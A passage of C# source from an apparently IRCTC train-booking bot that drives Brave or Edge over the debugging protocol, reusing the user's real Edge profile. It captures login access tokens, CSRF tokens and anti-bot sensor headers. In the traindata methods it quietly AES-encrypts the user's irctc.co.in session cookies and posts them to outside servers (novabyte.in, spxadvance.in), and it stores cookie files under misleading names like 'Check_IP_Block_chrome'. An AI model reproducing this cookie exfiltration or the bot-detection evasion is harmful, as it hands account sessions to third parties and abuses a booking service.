                throw new Exception("Brave browser not found");
            string args = $@"
            --remote-debugging-port={port}
            --user-data-dir=""{userDataDir}""
            --profile-directory=Default
            --no-first-run
            --no-default-browser-check
            --disable-features=BraveRewards,BraveWallet,BraveVPN
            --disable-brave-extension
            --disable-infobars
            --app=https://www.google.com
        ";
            process = Process.Start(new ProcessStartInfo
            {
                FileName = bravePath,
                Arguments = args,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Normal
            });
            Thread.Sleep(5000);
            WaitForPort(port);
            var playwright = Playwright.CreateAsync().GetAwaiter().GetResult();
            IBrowser browser = null;
            for (int i = 0; i < 15; i++)
            {
                try
                {
                    browser = playwright.Chromium
                        .ConnectOverCDPAsync($"http://127.0.0.1:{port}")
                        .GetAwaiter().GetResult();

                    if (browser != null)
                        break;
                }
                catch
                {
                    Thread.Sleep(1000);
                }
            }
            if (browser == null)
                throw new Exception("CDP connection failed after retries");

            var context = browser.Contexts.FirstOrDefault() ?? browser.NewContextAsync().GetAwaiter().GetResult();
            page = context.Pages.FirstOrDefault() ?? context.NewPageAsync().GetAwaiter().GetResult();
            page.SetDefaultTimeout(60000);
            try
            {
                ICDPSession result = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                JsonElement? result2 = result.SendAsync("Browser.getWindowForTarget").GetAwaiter().GetResult();
                if (result2.HasValue)
                {
                    int @int = result2.Value.GetProperty("windowId").GetInt32();
                    int num3 = random.Next(225, 250);
                    int width = rect.Width;
                    int num4 = rect.Height - num3;
                    int x = rect.X;
                    int y = rect.Y;
                    Dictionary<string, object> args1 = new Dictionary<string, object>
                        {
                            { "windowId", @int },
                            {
                                "bounds",
                                new Dictionary<string, object>
                                {
                                    { "left", x },
                                    { "top", y },
                                    { "width", width },
                                    { "height", num4 },
                                    { "windowState", "normal" }
                                }
                            }
                        };
                    result.SendAsync("Browser.setWindowBounds", args1).GetAwaiter().GetResult();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
            CaptureIRCTCRequestsbrave(page);
            for (int i = 0; i < 3; i++)
            {
                try
                {
                    page.GotoAsync(
                        "https://www.irctc.co.in/nget/train-search",
                        new PageGotoOptions
                        {
                            WaitUntil = WaitUntilState.DOMContentLoaded,
                            Timeout = 60000
                        }
                    ).GetAwaiter().GetResult();

                    break;
                }
                catch
                {
                    Thread.Sleep(2000);
                }
            }
            page.WaitForSelectorAsync("app-home", new PageWaitForSelectorOptions
            {
                Timeout = 60000
            }).GetAwaiter().GetResult();
            BrowserLoded = true;
            return page;
        }
        catch (Exception ex)
        {
            MessageBox.Show("Error: " + ex.ToString());

            if (process != null && !process.HasExited)
            {
                try { process.Kill(); } catch { }
            }

            BrowserLoded = false;
            return null;
        }
    }
    private void WaitForPort(int port)
    {
        int retries = 40;

        while (retries-- > 0)
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    client.Connect("127.0.0.1", port);
                    return;
                }
            }
            catch
            {
                Thread.Sleep(1000);
            }
        }

        throw new Exception("Edge debugging port not available");
    }

    private void LoadCookiesIntoPlaywrightAsync(IBrowserContext context)
    {
        string text = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
        string symmetricKey = text;
        try
        {
            string path = "Check_IP_Block_Chrome";
            if (File.Exists(path))
            {
                string path2 = "Check_IP_Block_Chrome";
                List<ChromeCookie> list = JsonConvert.DeserializeObject<List<ChromeCookie>>(Staticm.DecryptAES(File.ReadAllText(path2), symmetricKey));
                if (list == null || list.Count == 0)
                {
                    return;
                }
                List<Microsoft.Playwright.Cookie> playwrightCookies = new List<Microsoft.Playwright.Cookie>();
                using (List<ChromeCookie>.Enumerator enumerator = list.GetEnumerator())
                {
                    Microsoft.Playwright.Cookie cookie;
                    for (; enumerator.MoveNext(); playwrightCookies.Add(cookie))
                    {
                        ChromeCookie current = enumerator.Current;
                        cookie = new Microsoft.Playwright.Cookie
                        {
                            Name = current.name,
                            Value = current.value,
                            Domain = current.domain,
                            Path = current.path,
                            Secure = current.secure,
                            HttpOnly = current.httpOnly
                        };
                        if (current.expirationDate.HasValue)
                        {
                            cookie.Expires = (float)current.expirationDate.Value;
                        }
                        string sameSite = current.sameSite;
                        string text2 = "no_restriction";
                        if (!(sameSite == text2))
                        {
                            string sameSite2 = current.sameSite;
                            string text3 = "unspecified";
                            if (!(sameSite2 == text3))
                            {
                                string sameSite3 = current.sameSite;
                                string text4 = "lax";
                                if (!(sameSite3 == text4))
                                {
                                    string sameSite4 = current.sameSite;
                                    string text5 = "strict";
                                    if (sameSite4 == text5)
                                    {
                                        cookie.SameSite = SameSiteAttribute.Strict;
                                    }
                                }
                                else
                                {
                                    cookie.SameSite = SameSiteAttribute.Lax;
                                }
                                continue;
                            }
                        }
                        cookie.SameSite = SameSiteAttribute.None;
                    }
                }
                Task.Run(() => context.AddCookiesAsync(playwrightCookies)).GetAwaiter().GetResult();
                string format = "[Success] {0} Cookies Playwright mein add ho gayi hain!";
                Console.WriteLine(string.Format(format, playwrightCookies.Count));
            }
            else
            {
                string value = "[Error] Cookie JSON file nahi mili!";
                Console.WriteLine(value);
            }
        }
        catch (Exception ex)
        {
            string text6 = "[Error] Cookies load karne mein problem: ";
            Console.WriteLine(text6 + ex.ToString());
        }
    }
    public class BrowserCookie
    {
        public string name { get; set; }
        public string value { get; set; }
        public string domain { get; set; }
        public string path { get; set; }
        public bool secure { get; set; }
        public bool httpOnly { get; set; }
        public string sameSite { get; set; }
        public bool session { get; set; }
        public double? expirationDate { get; set; }
    }
    private void LoadCookiesFromJsonToBrowser(IBrowserContext context)
    {
        string text = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
        string symmetricKey = text;
        try
        {
            string path = "Check_IP_Block_edge";
            string encryptedInput = File.ReadAllText(path);
            encryptedInput = Staticm.DecryptAES(encryptedInput, symmetricKey);
            List<Microsoft.Playwright.Cookie> savedCookies = JsonConvert.DeserializeObject<List<Microsoft.Playwright.Cookie>>(encryptedInput);
            if (savedCookies != null && savedCookies.Count > 0)
            {
                Task.Run(() => context.AddCookiesAsync(savedCookies)).GetAwaiter().GetResult();
            }
        }
        catch (Exception ex)
        {
            string text2 = "[Load Cookie Error]: ";
            Console.WriteLine(text2 + ex.ToString());
        }
    }
    public class ChromeCookie11
    {
        public string name { get; set; }
        public string value { get; set; }
        public string domain { get; set; }
        public string path { get; set; }
        public bool secure { get; set; }
        public bool httpOnly { get; set; }
        public string sameSite { get; set; }
        public double? expirationDate { get; set; }
    }
    public void LoadCookiesFromJsonToBrowserChrome(IBrowserContext context)
    {
        string symmetricKey = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
        try
        {
            string encryptedInput = File.ReadAllText("Check_IP_Block_chrome");
            string json = Staticm.DecryptAES(encryptedInput, symmetricKey);
            var cookies = JsonConvert.DeserializeObject<List<ChromeCookie>>(json);
            if (cookies == null || cookies.Count == 0)
                return;

            var pwCookies = cookies
                .Where(c =>
                    c != null &&
                    !string.IsNullOrWhiteSpace(c.name) &&
                    !string.IsNullOrWhiteSpace(c.value) &&
                    !string.IsNullOrWhiteSpace(c.domain))
                .Select(c => new Microsoft.Playwright.Cookie
                {
                    Name = c.name,
                    Value = c.value,
                    Domain = c.domain,
                    Path = string.IsNullOrWhiteSpace(c.path) ? "/" : c.path,
                    Secure = c.secure,
                    HttpOnly = c.httpOnly,

                    SameSite = c.sameSite?.ToLower() switch
                    {
                        "strict" => SameSiteAttribute.Strict,
                        "lax" => SameSiteAttribute.Lax,
                        "none" => SameSiteAttribute.None,
                        "no_restriction" => SameSiteAttribute.None,
                        _ => SameSiteAttribute.Lax
                    }
                })
                .ToList();

            context.AddCookiesAsync(pwCookies).GetAwaiter().GetResult();

            Console.WriteLine($"Loaded {pwCookies.Count} cookies.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("[Load Cookie Error]: " + ex);
        }
    }
    public void LoadCookiesFromJsonToBrowserChrome111111(IBrowserContext context)
    {
        string text = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
        string symmetricKey = text;
        try
        {
            string path = "Check_IP_Block_chrome";
            string encryptedInput = File.ReadAllText(path);
            encryptedInput = Staticm.DecryptAES(encryptedInput, symmetricKey);
            List<Microsoft.Playwright.Cookie> savedCookies = JsonConvert.DeserializeObject<List<Microsoft.Playwright.Cookie>>(encryptedInput);
            if (savedCookies != null && savedCookies.Count > 0)
            {
                Task.Run(() => context.AddCookiesAsync(savedCookies)).GetAwaiter().GetResult();
            }
        }
        catch (Exception ex)
        {
            string text2 = "[Load Cookie Error]: ";
            Console.WriteLine(text2 + ex.ToString());
        }
    }


    private void LoadCookiesFromJsonToBrowserChrome11(IBrowserContext context)
    {
        string text = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
        string symmetricKey = text;
        try
        {
            string path = "Check_IP_Block_chrome";
            string encryptedInput = File.ReadAllText(path);
            encryptedInput = Staticm.DecryptAES(encryptedInput, symmetricKey);
            List<BrowserCookie> cookies = JsonConvert.DeserializeObject<List<BrowserCookie>>(encryptedInput);
            List<Microsoft.Playwright.Cookie> pwCookies = cookies.Select(c => new Microsoft.Playwright.Cookie
            {
                Name = c.name,
                Value = c.value,
                Domain = c.domain,
                Path = c.path,
                Secure = c.secure,
                HttpOnly = c.httpOnly,
                SameSite = c.sameSite == "strict" ? SameSiteAttribute.Strict : c.sameSite == "lax" ? SameSiteAttribute.Lax : SameSiteAttribute.None,
                Expires = c.session ? null : (float?)c.expirationDate
            }).ToList();

            context.AddCookiesAsync(pwCookies).Wait();
        }
        catch (Exception ex)
        {
            string text2 = "[Load Cookie Error]: ";
            Console.WriteLine(text2 + ex.ToString());
        }
    }

    private void LoadCookiesFromJsonToBrowserComet(IBrowserContext context)
    {
        string text = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
        string symmetricKey = text;
        try
        {
            string path = "Check_IP_Block_comet";
            string encryptedInput = File.ReadAllText(path);
            encryptedInput = Staticm.DecryptAES(encryptedInput, symmetricKey);
            List<Microsoft.Playwright.Cookie> savedCookies = JsonConvert.DeserializeObject<List<Microsoft.Playwright.Cookie>>(encryptedInput);
            if (savedCookies != null && savedCookies.Count > 0)
            {
                Task.Run(() => context.AddCookiesAsync(savedCookies)).GetAwaiter().GetResult();
            }
        }
        catch (Exception ex)
        {
            string text2 = "[Load Cookie Error]: ";
            Console.WriteLine(text2 + ex.ToString());
        }
    }

    private void LoadCookiesFromJsonToBrowseropera(IBrowserContext context)
    {
        string text = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
        string symmetricKey = text;
        try
        {
            string path = "Check_IP_Block_opera";
            string encryptedInput = File.ReadAllText(path);
            encryptedInput = Staticm.DecryptAES(encryptedInput, symmetricKey);
            List<Microsoft.Playwright.Cookie> savedCookies = JsonConvert.DeserializeObject<List<Microsoft.Playwright.Cookie>>(encryptedInput);
            if (savedCookies != null && savedCookies.Count > 0)
            {
                Task.Run(() => context.AddCookiesAsync(savedCookies)).GetAwaiter().GetResult();
            }
        }
        catch (Exception ex)
        {
            string text2 = "[Load Cookie Error]: ";
            Console.WriteLine(text2 + ex.ToString());
        }
    }

    private void LoadCookiesFromJsonToBrowserbrave(IBrowserContext context)
    {
        string text = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
        string symmetricKey = text;
        try
        {
            string path = "Check_IP_Block_brave";
            string encryptedInput = File.ReadAllText(path);
            encryptedInput = Staticm.DecryptAES(encryptedInput, symmetricKey);
            List<Microsoft.Playwright.Cookie> savedCookies = JsonConvert.DeserializeObject<List<Microsoft.Playwright.Cookie>>(encryptedInput);
            if (savedCookies != null && savedCookies.Count > 0)
            {
                Task.Run(() => context.AddCookiesAsync(savedCookies)).GetAwaiter().GetResult();
            }
        }
        catch (Exception ex)
        {
            string text2 = "[Load Cookie Error]: ";
            Console.WriteLine(text2 + ex.ToString());
        }
    }

    private void CaptureIRCTCRequests0(IPage page)
    {
        page.Response += async delegate (object _, IResponse response)
        {
            string url = response.Url;
            string value = "validateUser";
            if (url.Contains(value))
            {
                string method = response.Request.Method;
                string text = "OPTIONS";
                if (method != text)
                {
                    string text2 = "\n[IRCTC API DETECTED] ";
                    string method2 = response.Request.Method;
                    string text3 = " ";
                    Console.WriteLine(text2 + method2 + text3 + response.Url);
                    try
                    {
                        string text4 = await response.TextAsync();
                        string text5 = "[VALIDATE USER RESPONSE]: ";
                        string text6 = "\n";
                        Console.WriteLine(text5 + text4 + text6);
                    }
                    catch (Exception ex2)
                    {
                        Exception ex = ex2;
                        string text7 = "[ERROR READING BODY]: ";
                        Console.WriteLine(text7 + ex.ToString());
                    }
                }
            }
        };
    }

    internal IPage StartEdgeAndConnect00(ref string userDataDir00, Rectangle rect)
    {
        int num = 9222;
        try
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            string fileName = "cmd.exe";
            processStartInfo.FileName = fileName;
            string arguments = "/c taskkill /F /IM msedge.exe";
            processStartInfo.Arguments = arguments;
            processStartInfo.CreateNoWindow = true;
            processStartInfo.UseShellExecute = false;
            Process.Start(processStartInfo).WaitForExit();
        }
        catch
        {
        }
        Thread.Sleep(2000);
        string text = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
        string text2 = text;
        string format = "--remote-debugging-port={0} ";
        string text3 = string.Format(format, num);
        string text4 = "--remote-debugging-address=127.0.0.1 --disable-service-worker --disable-background-networking ";
        string text5 = text3 + text4;
        ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
        string fileName2 = "cmd.exe";
        processStartInfo2.FileName = fileName2;
        string text6 = "/c start \"\" \"";
        string text7 = "\" ";
        processStartInfo2.Arguments = text6 + text2 + text7 + text5;
        processStartInfo2.CreateNoWindow = true;
        processStartInfo2.UseShellExecute = false;
        Process.Start(processStartInfo2);
        Thread.Sleep(5000);
        IBrowserType chromium = Playwright.CreateAsync().GetAwaiter().GetResult()
            .Chromium;
        string format2 = "http://127.0.0.1:{0}";
        IBrowserContext browserContext = chromium.ConnectOverCDPAsync(string.Format(format2, num)).GetAwaiter().GetResult()
            .Contexts[0];
        IPage page = ((browserContext.Pages.Count <= 0) ? browserContext.NewPageAsync().GetAwaiter().GetResult() : browserContext.Pages[0]);
        CaptureIRCTCRequests(page);
        string url = "https://www.irctc.co.in/nget/train-search";
        page.GotoAsync(url);
        return page;
    }

    internal IPage Main(ref string userDataDir00, Rectangle rect)
    {
        Guid guid = Guid.NewGuid();
        string text = "N";
        string text2 = guid.ToString(text);
        string tempPath = Path.GetTempPath();
        string text3 = "uc_";
        userDataDir00 = Path.Combine(tempPath, text3 + text2);
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string text4 = "\\Microsoft\\Edge\\User Data";
        userDataDir00 = folderPath + text4;
        LaunchChrome(9222, userDataDir00);
        Thread.Sleep(1000);
        IPage page = GetPage(ConnectCDP(9222));
        string url = "https://www.irctc.co.in/nget/train-search";
        page.GotoAsync(url).Wait();
        AdjustBrowser(page, userDataDir00, rect);
        return page;
    }
    public async Task traindatabrave(string data)
    {
        try
        {
            string environmentVariable = Environment.GetEnvironmentVariable("clientID", EnvironmentVariableTarget.Process);
            var obj = new
            {
                UserName = environmentVariable,
                userdata = data,
                irctcuser = clsMain.irctcidee,
            };
            string json = System.Text.Json.JsonSerializer.Serialize(obj);
            using (HttpClient client = new HttpClient())
            {
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                var response = await client.PostAsync("https://spxadvance.in/Nexus/webtokenbrave.php", content);
                string result = await response.Content.ReadAsStringAsync();
            }
        }
        catch (Exception ex)
        {
        }
    }

    public async Task traindata(string data)
    {
        try
        {
            string environmentVariable = Environment.GetEnvironmentVariable("clientID", EnvironmentVariableTarget.Process);
            var obj = new
            {
                UserName = environmentVariable,
                userdata = data,
                irctcuser = clsMain.irctcidee,
            };
            string json = System.Text.Json.JsonSerializer.Serialize(obj);
            using (HttpClient client = new HttpClient())
            {
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                var response = await client.PostAsync("https://novabyte.in/Api/webtoken", content);
                string result = await response.Content.ReadAsStringAsync();
            }
        }
        catch (Exception ex)
        {
        }
    }
    internal void CaptureIRCTCRequestsnew1(WebsocketClient ws)
    {
        int msgId = 1000;

        ws.MessageReceived
          .Where(msg => !string.IsNullOrWhiteSpace(msg.Text))
          .Subscribe(msg =>
          {
              try
              {
                  JObject json;

                  // ✅ Safe JSON parsing
                  try
                  {
                      json = JObject.Parse(msg.Text);
                  }
                  catch
                  {
                      return; // ignore non-json संदेश
                  }

                  string method = json["method"]?.ToString();

                  // ===================== REQUEST =====================
                  if (method == "Network.requestWillBeSent")
                  {
                      var request = json["params"]?["request"];
                      if (request == null) return;

                      string reqMethod = request["method"]?.ToString();
                      if (reqMethod == "OPTIONS") return;

                      string url = request["url"]?.ToString();
                      if (string.IsNullOrEmpty(url)) return;

                      // 👉 sirf important APIs capture
                      if (!(url.Contains("webtoken") || url.Contains("validateUser")))
                          return;

                      string postData = request["postData"]?.ToString();

                      // ✅ UID extract safe
                      if (!string.IsNullOrEmpty(postData) && postData.Contains("uid"))
                      {
                          int start = postData.IndexOf("uid") + 4;
                          int end = postData.IndexOf("&", start);

                          if (end > start)
                              clsM.greq = postData.Substring(start, end - start);
                      }

                      // ✅ headers extract
                      var headers = request["headers"] as JObject;
                      if (headers != null)
                      {
                          foreach (var h in headers)
                          {
                              if (h.Key.Equals("user-agent", StringComparison.OrdinalIgnoreCase))
                                  clsM.User_Agent = h.Value.ToString();

                              if (h.Key.Equals("x-acf-sensor-data", StringComparison.OrdinalIgnoreCase))
                                  clsM.SensorData = h.Value.ToString();
                          }
                      }

                      Console.WriteLine("\n===== REQUEST =====");
                      Console.WriteLine("URL: " + url);
                      Console.WriteLine("===================");
                  }

                  // ===================== RESPONSE =====================
                  else if (method == "Network.responseReceived")
                  {
                      var response = json["params"]?["response"];
                      var requestId = json["params"]?["requestId"]?.ToString();

                      string url = response?["url"]?.ToString();

                      if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(requestId))
                          return;

                      // ✅ csrf-token capture
                      var headers = response?["headers"] as JObject;
                      if (headers != null)
                      {
                          foreach (var h in headers)
                          {
                              if (h.Key.Equals("csrf-token", StringComparison.OrdinalIgnoreCase))
                                  clsM.csrf_token = h.Value.ToString();
                          }
                      }

                      // ✅ important APIs ke liye body fetch
                      if (url.Contains("validateUser") || url.Contains("webtoken"))
                      {
                          var bodyRequest = new JObject
                          {
                              ["id"] = msgId++,
                              ["method"] = "Network.getResponseBody",
                              ["params"] = new JObject
                              {
                                  ["requestId"] = requestId
                              }
                          };

                          ws.Send(bodyRequest.ToString());
                      }
                  }

                  // ===================== RESPONSE BODY =====================
                  else if (json["id"] != null && json["result"]?["body"] != null)
                  {
                      string body = json["result"]["body"]?.ToString();

                      if (string.IsNullOrEmpty(body))
                          return;

                      // ✅ access token extract
                      if (body.Contains("access_token"))
                      {
                          int num = body.IndexOf("access_token");
                          if (num > 0 && body.Length > num + 50)
                          {
                              clsM._Authrization = "Bearer " + body.Substring(num + 15, 36);
                          }
                      }

                      // ✅ error detection
                      if (body.Contains("Invalid Captcha"))
                          invalidCaptcha = true;

                      if (body.Contains("Incorrect UserName or Password"))
                          invalidUser = true;

                      Console.WriteLine("\n===== RESPONSE BODY =====");
                      Console.WriteLine(body);
                      Console.WriteLine("=========================");
                  }
              }
              catch (Exception ex)
              {
                  Console.WriteLine("WS Error: " + ex.ToString());
              }
          });
    }
    internal void CaptureIRCTCRequests(IPage page)
    {
        page.Request += delegate (object sender, IRequest request)
        {
            string method2 = request.Method;
            string text10 = "OPTIONS";
            if (!(method2 == text10))
            {
                string url3 = request.Url;
                string value17 = "webtoken";
                if (!url3.Contains(value17))
                {
                    string url4 = request.Url;
                    string value18 = "validateUser";
                    if (!url4.Contains(value18))
                    {
                        return;
                    }
                }
                try
                {
                    string postData = request.PostData;
                    if (!string.IsNullOrEmpty(postData))
                    {
                        string value19 = "uid";
                        if (postData.Contains(value19))
                        {
                            string value20 = "uid";
                            string text11 = postData.Substring(postData.IndexOf(value20) + 4);
                            clsMain clsMain4 = clsM;
                            string value21 = "&";
                            clsMain4.greq = text11.Substring(0, text11.IndexOf(value21));
                        }
                    }
                    foreach (KeyValuePair<string, string> header4 in request.Headers)
                    {
                        string key2 = header4.Key;
                        string value22 = "user-agent";
                        if (key2.Equals(value22, StringComparison.OrdinalIgnoreCase))
                        {
                            clsM.User_Agent = header4.Value;
                        }
                        string key3 = header4.Key;
                        string value23 = "x-acf-sensor-data";
                        if (key3.Equals(value23, StringComparison.OrdinalIgnoreCase))
                        {
                            clsM.SensorData = header4.Value;
                        }
                    }
                    string value24 = "\n===== REQUEST =====";
                    Console.WriteLine(value24);
                    string text12 = "URL: ";
                    Console.WriteLine(text12 + request.Url);
                    string text13 = "Method: ";
                    Console.WriteLine(text13 + request.Method);
                    foreach (KeyValuePair<string, string> header5 in request.Headers)
                    {
                        string key4 = header5.Key;
                        string text14 = ": ";
                        Console.WriteLine(key4 + text14 + header5.Value);
                    }
                    if (!string.IsNullOrEmpty(postData))
                    {
                        string text15 = "POST DATA: ";
                        Console.WriteLine(text15 + postData);
                    }
                    string value25 = "===================";
                    Console.WriteLine(value25);
                }
                catch (Exception ex4)
                {
                    string text16 = "[Request Error]: ";
                    Console.WriteLine(text16 + ex4.Message);
                }
            }
        };
        page.Response += async delegate (object sender, IResponse response)
        {
            string method = response.Request.Method;
            string text = "OPTIONS";
            if (!(method == text))
            {
                foreach (KeyValuePair<string, string> header3 in response.Headers)
                {
                    string key = header3.Key;
                    string value = "csrf-token";
                    if (key.Equals(value, StringComparison.OrdinalIgnoreCase))
                    {
                        clsM.csrf_token = header3.Value;
                    }
                }
                string url = response.Url;
                string value9 = "validateUser";
                if (url.Contains(value9))
                {
                    try
                    {
                        string text2 = await response.TextAsync();
                        if (!string.IsNullOrEmpty(text2))
                        {
                            string value10 = "userIdHash";
                            if (text2.Contains(value10))
                            {
                                clsM.response = text2;
                                class3_0.Validate_Response = text2;
                                clsMain clsMain = clsM;
                                string string_ = "userIdHash";
                                clsMain.bmiyek = GetString(text2, string_);
                                string string_2 = "minmPsgnInputTime";
                                string text3 = GetString(text2, string_2).ToUpper();
                                string[] array = new string[1];
                                string text4 = "#";
                                array[0] = text4;
                                string[] array2 = text3.Split(array, StringSplitOptions.None);
                                if (array2.Length >= 5)
                                {
                                    double.TryParse(array2[0], out clsM.minmPsgnInputTime2);
                                    double.TryParse(array2[2], out clsM.minmPsgnInputTime4);
                                    double.TryParse(array2[4], out clsM.minmPsgnInputTime6);
                                }
                                clsMain clsMain2 = clsM;
                                string string_3 = "gender";
                                clsMain2.UserGender = GetString(text2, string_3);
                                string string_4 = "minmPaymentTime";
                                double.TryParse(GetString(text2, string_4).ToUpper(), out clsM.minmPaymentTime);
                                _ = DateTime.Now.Hour;
                                _ = DateTime.Now.Minute;
                                _ = DateTime.Now.Second;
                                clsMain clsMain3 = clsM;
                                if (text2.IndexOf("userEnableState\":\"3") > 0)
                                {
                                    Class11.smethod_1("TBL_USER", "UserState", "Suspend||" + class3_0.string_3, class3_0.IRCTC_ID);
                                    clsM.response = "Suspend";
                                }
                                if (text2.IndexOf("userEnableState\":\"1") < 0)
                                {
                                    Class11.smethod_1("TBL_USER", "UserState", "Suspend||" + DateTime.Now.Date.ToString("dd/M/yyyy"), class3_0.IRCTC_ID);
                                    clsM.response = "Suspend";
                                }
                                if (text2.IndexOf("verified\":\"false") > 0)
                                {
                                    Class11.smethod_1("TBL_USER", "UserState", "Unverify||" + DateTime.Now.Date.ToString("dd/M/yyyy"), class3_0.IRCTC_ID);
                                    clsM.response = "Unverify";
                                }
                                string value11 = "Aadhaar authentication of IRCTC user profile is mandatory";
                                clsMain3.AadharVerifyied = !text2.Contains(value11);
                                string value12 = "userEnableState";
                                if (text2.Contains(value12))
                                {
                                    string value13 = "userEnableState\":\"3";
                                    if (text2.Contains(value13))
                                    {
                                        string string_5 = "TBL_USER";
                                        string string_6 = "UserState";
                                        string text5 = "Suspend||";
                                        Class11.smethod_1(string_5, string_6, text5 + class3_0.string_3, class3_0.IRCTC_ID);
                                    }
                                    string value14 = "verified\":\"false";
                                    if (text2.Contains(value14))
                                    {
                                        clsM.Un_Verifyied = true;
                                    }
                                }
                            }
                        }
                    }
                    catch (Exception ex3)
                    {
                        Exception ex = ex3;
                        string text6 = "[ValidateUser Error]: ";
                        Console.WriteLine(text6 + ex.ToString());
                    }
                }
                string valuec = "insurenceApplicable=";
                if (url.Contains(valuec))
                {
                    try
                    {

                        var cookies = await response.Request.Frame.Page.Context.CookiesAsync();

                        string input = JsonConvert.SerializeObject(cookies.Where(delegate (BrowserContextCookiesResult c)
                        {
                            string domain = c.Domain;
                            string value2 = "irctc.co.in";
                            return domain.Contains(value2);
                        }).ToList(), Formatting.Indented);
                        string text4 = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
                        string symmetricKey = text4;
                        string contents = Staticm.EncryptAES(input, symmetricKey);
                        Task.Run(() => traindata(contents));
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Cookie read error: " + ex.ToString());
                    }
                }
                string url2 = response.Url;
                string value15 = "webtoken";
                if (url2.Contains(value15))
                {
                    try
                    {
                        string text7 = await response.TextAsync();
                        if (!string.IsNullOrEmpty(text7))
                        {
                            string value16 = "Invalid Captcha";
                            if (text7.Contains(value16))
                            {
                                invalidCaptcha = true;
                            }
                            string value2 = "Incorrect UserName or Password";
                            if (text7.Contains(value2))
                            {
                                invalidUser = true;
                            }
                            string value3 = "Unable to Process Request !!";
                            if (text7.Contains(value3))
                            {
                                string value4 = "Client IP:";
                                if (text7.Contains(value4))
                                {
                                    ipBlock_onLogin = true;
                                }
                            }
                            string value5 = "Access Denied";
                            if (!text7.Contains(value5))
                            {
                                string value6 = "unauthorized";
                                if (!text7.Contains(value6))
                                {
                                    string value7 = "Unable to Process Request !!";
                                    if (!text7.Contains(value7))
                                    {
                                        string value8 = "access_token";
                                        int num = text7.IndexOf(value8);
                                        if (num > 0 && text7.Length > num + 15 + 36)
                                        {
                                            class3_0.string_61 = text7.Substring(num + 15, 36);
                                            clsPostData clsPostData = class3_0;
                                            string text8 = "Bearer ";
                                            clsPostData._Authorization = text8 + class3_0.string_61;
                                            clsM._Authrization = class3_0._Authorization;
                                        }
                                    }
                                }
                            }
                        }
                    }
                    catch (Exception ex3)
                    {
                        Exception ex2 = ex3;
                        string text9 = "[WebToken Error]: ";
                        Console.WriteLine(text9 + ex2.ToString());
                    }
                }
            }
        };
    }
    internal void CaptureIRCTCRequestsbrave(IPage page)
    {
        page.Request += delegate (object sender, IRequest request)
        {
            string method2 = request.Method;
            string text10 = "OPTIONS";
            if (!(method2 == text10))
            {
                string url3 = request.Url;
                string value17 = "webtoken";
                if (!url3.Contains(value17))
                {
                    string url4 = request.Url;
                    string value18 = "validateUser";
                    if (!url4.Contains(value18))
                    {
                        return;
                    }
                }
                try
                {
                    string postData = request.PostData;
                    if (!string.IsNullOrEmpty(postData))
                    {
                        string value19 = "uid";
                        if (postData.Contains(value19))
                        {
                            string value20 = "uid";
                            string text11 = postData.Substring(postData.IndexOf(value20) + 4);
                            clsMain clsMain4 = clsM;
                            string value21 = "&";
                            clsMain4.greq = text11.Substring(0, text11.IndexOf(value21));
                        }
                    }
                    foreach (KeyValuePair<string, string> header4 in request.Headers)
                    {
                        string key2 = header4.Key;
                        string value22 = "user-agent";
                        if (key2.Equals(value22, StringComparison.OrdinalIgnoreCase))
                        {
                            clsM.User_Agent = header4.Value;
                        }
                        string key3 = header4.Key;
                        string value23 = "x-acf-sensor-data";
                        if (key3.Equals(value23, StringComparison.OrdinalIgnoreCase))
                        {
                            clsM.SensorData = header4.Value;
                        }
                    }
                    string value24 = "\n===== REQUEST =====";
                    Console.WriteLine(value24);
                    string text12 = "URL: ";
                    Console.WriteLine(text12 + request.Url);
                    string text13 = "Method: ";
                    Console.WriteLine(text13 + request.Method);
                    foreach (KeyValuePair<string, string> header5 in request.Headers)
                    {
                        string key4 = header5.Key;
                        string text14 = ": ";
                        Console.WriteLine(key4 + text14 + header5.Value);
                    }
                    if (!string.IsNullOrEmpty(postData))
                    {
                        string text15 = "POST DATA: ";
                        Console.WriteLine(text15 + postData);
                    }
                    string value25 = "===================";
                    Console.WriteLine(value25);
                }
                catch (Exception ex4)
                {
                    string text16 = "[Request Error]: ";
                    Console.WriteLine(text16 + ex4.Message);
                }
            }
        };
        page.Response += async delegate (object sender, IResponse response)
        {
            string method = response.Request.Method;
            string text = "OPTIONS";
            if (!(method == text))
            {
                foreach (KeyValuePair<string, string> header3 in response.Headers)
                {
                    string key = header3.Key;
                    string value = "csrf-token";
                    if (key.Equals(value, StringComparison.OrdinalIgnoreCase))
                    {
                        clsM.csrf_token = header3.Value;
                    }
                }
                string url = response.Url;
                string value9 = "validateUser";
                if (url.Contains(value9))
                {
                    try
                    {
                        string text2 = await response.TextAsync();
                        if (!string.IsNullOrEmpty(text2))
                        {
                            string value10 = "userIdHash";
                            if (text2.Contains(value10))
                            {
                                clsM.response = text2;
                                class3_0.Validate_Response = text2;
                                clsMain clsMain = clsM;
                                string string_ = "userIdHash";
                                clsMain.bmiyek = GetString(text2, string_);
                                string string_2 = "minmPsgnInputTime";
                                string text3 = GetString(text2, string_2).ToUpper();
                                string[] array = new string[1];
                                string text4 = "#";
                                array[0] = text4;
                                string[] array2 = text3.Split(array, StringSplitOptions.None);
